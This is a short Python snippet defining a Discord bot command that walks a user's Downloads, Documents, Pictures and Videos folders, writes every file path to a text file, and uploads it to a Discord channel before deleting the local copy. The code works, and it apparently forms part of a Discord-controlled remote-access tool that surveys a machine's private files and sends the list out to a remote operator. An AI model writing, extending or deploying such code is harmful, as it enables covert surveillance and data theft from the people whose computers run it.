import os, discord
async def tree(ctx):
    root_directories = [
        os.path.expanduser("~/Downloads"),
        os.path.expanduser("~/Documents"),
        os.path.expanduser("~/Pictures"),
        os.path.expanduser("~/Videos")
    ]

    tree_text = ""
    for root_dir in root_directories:
        tree_text += f"=== Files under {root_dir} ===\n"
        for root, _, files in os.walk(root_dir):
            for file_name in files:
                file_path = os.path.join(root, file_name)
                tree_text += f"{file_path}\n"
    
    file_path = "file_tree.txt"
    with open(file_path, "w", encoding="utf-8") as file:
        file.write(tree_text)
    
    file_to_send = discord.File(file_path, filename="file_tree.txt")
    await ctx.send("File tree generated.", file=file_to_send)
    
    os.remove(file_path)